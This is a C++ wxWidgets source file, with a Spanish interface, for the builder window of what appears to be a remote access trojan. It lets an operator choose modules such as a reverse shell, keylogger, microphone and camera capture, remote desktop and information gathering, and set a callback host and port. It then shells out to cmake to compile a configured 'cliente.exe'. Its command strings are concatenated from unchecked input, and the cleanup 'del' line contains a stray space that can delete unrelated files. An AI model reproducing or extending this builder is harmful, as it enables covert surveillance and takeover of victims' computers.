#include "frame_builder.hpp"
#include "misc.hpp"
#include <wx/utils.h> 

wxBEGIN_EVENT_TABLE(FrameBuilder, wxFrame)
	EVT_BUTTON(EnumBuilderIDS::BTN_Generar, FrameBuilder::OnGenerarCliente)
wxEND_EVENT_TABLE()

FrameBuilder::FrameBuilder(wxWindow* pParent)
: wxFrame(pParent, wxID_ANY, "Generar cliente", wxDefaultPosition, wxDefaultSize){

	wxPanel* pnl_Main = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxDefaultSize);
	wxStaticBoxSizer* box_Server = new wxStaticBoxSizer(wxVERTICAL, pnl_Main, "Informacion de conexion");

	// Host y puerto de conexion
	wxBoxSizer* boxHost = new wxBoxSizer(wxHORIZONTAL);
	this->txtHost = new wxTextCtrl(pnl_Main, wxID_ANY, "127.0.0.1", wxDefaultPosition, wxDefaultSize);
	this->txtPort = new wxTextCtrl(pnl_Main, wxID_ANY, "65500", wxDefaultPosition, wxDefaultSize);

	boxHost->AddSpacer(10);
	boxHost->Add(new wxStaticText(pnl_Main, wxID_ANY, "Host:"));	
	boxHost->Add(this->txtHost, 1, wxALL | wxEXPAND);
	boxHost->AddSpacer(15);
	boxHost->Add(new wxStaticText(pnl_Main, wxID_ANY, "Puerto:"));
	boxHost->Add(this->txtPort, 0);
	boxHost->AddSpacer(10);

	box_Server->AddSpacer(10);
	box_Server->Add(boxHost);
	box_Server->AddSpacer(10);

	pnl_Main->SetSizer(box_Server);


	wxPanel* pnlMods = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxDefaultSize);
	wxStaticBoxSizer* box_Mods = new wxStaticBoxSizer(wxVERTICAL, pnlMods, "Modulos");

	this->chkShell =        new wxCheckBox(pnlMods, wxID_ANY, "Shell Inversa", wxDefaultPosition, wxDefaultSize);
	this->chkShell->SetValue(true);

	this->chkKeylogger =    new wxCheckBox(pnlMods, wxID_ANY, "Keylogger", wxDefaultPosition, wxDefaultSize);
	this->chkMic =          new wxCheckBox(pnlMods, wxID_ANY, "Microfono", wxDefaultPosition, wxDefaultSize);
	this->chkCam =          new wxCheckBox(pnlMods, wxID_ANY, "Camara", wxDefaultPosition, wxDefaultSize);
	this->chkRemoteDesk =   new wxCheckBox(pnlMods, wxID_ANY, "Escritorio Remoto", wxDefaultPosition, wxDefaultSize);
	this->chkReverseProxy = new wxCheckBox(pnlMods, wxID_ANY, "Proxy Inversa", wxDefaultPosition, wxDefaultSize);
	this->chkNetScan =      new wxCheckBox(pnlMods, wxID_ANY, "Escaner de Red", wxDefaultPosition, wxDefaultSize);
	this->chkAdmArchivos =  new wxCheckBox(pnlMods, wxID_ANY, "Administrador de Archivos", wxDefaultPosition, wxDefaultSize);
	this->chkAdmProcesos =  new wxCheckBox(pnlMods, wxID_ANY, "Administrador de Procesos", wxDefaultPosition, wxDefaultSize);
	this->chkAdmVentanas =  new wxCheckBox(pnlMods, wxID_ANY, "Administrador de Ventanas", wxDefaultPosition, wxDefaultSize);
	this->chkInformacion =  new wxCheckBox(pnlMods, wxID_ANY, "Recoleccion de informacion", wxDefaultPosition, wxDefaultSize);
	this->chkBromas =       new wxCheckBox(pnlMods, wxID_ANY, "Bromas :v", wxDefaultPosition, wxDefaultSize);

	box_Mods->AddSpacer(10);
	box_Mods->Add(this->chkShell);
	box_Mods->Add(this->chkKeylogger);
	box_Mods->Add(this->chkMic);
	box_Mods->Add(this->chkCam);
	box_Mods->Add(this->chkRemoteDesk);
	box_Mods->Add(this->chkReverseProxy);
	box_Mods->Add(this->chkNetScan);
	box_Mods->Add(this->chkAdmArchivos);
	box_Mods->Add(this->chkAdmProcesos);
	box_Mods->Add(this->chkAdmVentanas);
	box_Mods->Add(this->chkInformacion);
	box_Mods->Add(this->chkBromas);
	box_Mods->AddSpacer(10);

	pnlMods->SetSizer(box_Mods);

	this->btnGenerar = new wxButton(this, EnumBuilderIDS::BTN_Generar, "Generar cliente");


	wxBoxSizer* main_sizer = new wxBoxSizer(wxVERTICAL);
	main_sizer->AddSpacer(10);
	main_sizer->Add(pnl_Main);
	main_sizer->AddSpacer(10);
	main_sizer->Add(pnlMods, 1, wxALL | wxEXPAND);
	main_sizer->AddSpacer(10);
	main_sizer->Add(this->btnGenerar, 0, wxALL | wxEXPAND);
	main_sizer->AddSpacer(10);

	this->SetSizerAndFit(main_sizer);

	this->SetSizeHints(this->GetSize(), this->GetSize());

	ChangeMyChildsTheme(this, THEME_BACKGROUND_COLOR, THEME_FOREGROUND_COLOR, THEME_FONT_GLOBAL);
}

void FrameBuilder::OnGenerarCliente(wxCommandEvent& event) {

	//Folder temporal para compilar binario
	wxString strNewfolder = ".\\build-" + RandomID(8);
	if (!::CreateDirectoryA(strNewfolder, NULL)) {
		wxMessageBox("No se pudo crear el directorio " + strNewfolder);
		return;
	}

	wxString strCmd = "cmake --fresh -B ";
	strCmd.append(strNewfolder);
	strCmd.append(1, ' ');
		
	//Mods a usar
	if (this->chkShell->GetValue()) {
		strCmd.append("-DUSE_SHELL=ON ");
	}
	if (this->chkKeylogger->GetValue()) {
		strCmd.append("-DUSE_KL=ON ");
	}
	if (this->chkMic->GetValue()) {
		strCmd.append("-DUSE_MIC=ON ");
	}
	if (this->chkCam->GetValue()) {
		strCmd.append("-DUSE_CAM=ON ");
	}
	if (this->chkRemoteDesk->GetValue()) {
		strCmd.append("-DUSE_RD=ON ");
	}
	if (this->chkReverseProxy->GetValue()) {
		strCmd.append("-DUSE_RP=ON ");
	}
	if (this->chkNetScan->GetValue()) {
		strCmd.append("-DUSE_SCAN=ON ");
	}
	if (this->chkAdmArchivos->GetValue()) {
		strCmd.append("-DUSE_FM=ON ");
	}
	if (this->chkAdmProcesos->GetValue()) {
		strCmd.append("-DUSE_PM=ON ");
	}
	if (this->chkAdmVentanas->GetValue()) {
		strCmd.append("-DUSE_WM=ON ");
	}
	if (this->chkInformacion->GetValue()) {
		strCmd.append("-DUSE_INFO=ON ");
	}
	if (this->chkBromas->GetValue()) {
		strCmd.append("-DUSE_FUN=ON ");
	}

	wxString strHost = this->txtHost->GetValue();
	wxString strPort = this->txtPort->GetValue();

	//Talvez una mejor verificacion de ip :v
	if (strHost.Length() == 0) {
		wxMessageBox("El host es invalido", "Error");
		return;
	}

	strCmd.append("-DSRV_ADDR=");
	strCmd.append(strHost);
	strCmd.append(1, ' ');
	
	if (strPort.Length() == 0) {
		wxMessageBox("El port es invalido", "Error");
		return;
	}

	strCmd.append("-DSRV_ADDR_PORT=");
	strCmd.append(strPort);
	
	wxString strRutaSource = " ";

	wxDirDialog dialog(this, "Ruta del codigo");
	if (dialog.ShowModal() == wxID_OK) {
		strRutaSource.append(dialog.GetPath());
	}else {
		return;
	}

	strCmd.append(strRutaSource);
	strCmd.append(" && cmake --build ");
	strCmd.append(strNewfolder);
	strCmd.append(" --config Release && ");
	strCmd.append("xcopy " + strNewfolder + "\\Release\\cliente.exe .\\ && ");
	strCmd.append("del /S /Q " + strNewfolder + "\\* .* && ");
	strCmd.append("rmdir /S /Q .\\" + strNewfolder + "\\.");

	wxShell(strCmd);

	if (!::CreateDirectoryA(strNewfolder, NULL)) {
		wxMessageBox("No se pudo crear el directorio " + strNewfolder);
		return;
	}

	strCmd = "xcopy .\\cliente.exe .\\" + strNewfolder + "\\ && del /Q /F .\\cliente.exe";

	wxShell(strCmd);

	wxMessageBox("Cliente listo en " + strNewfolder);
}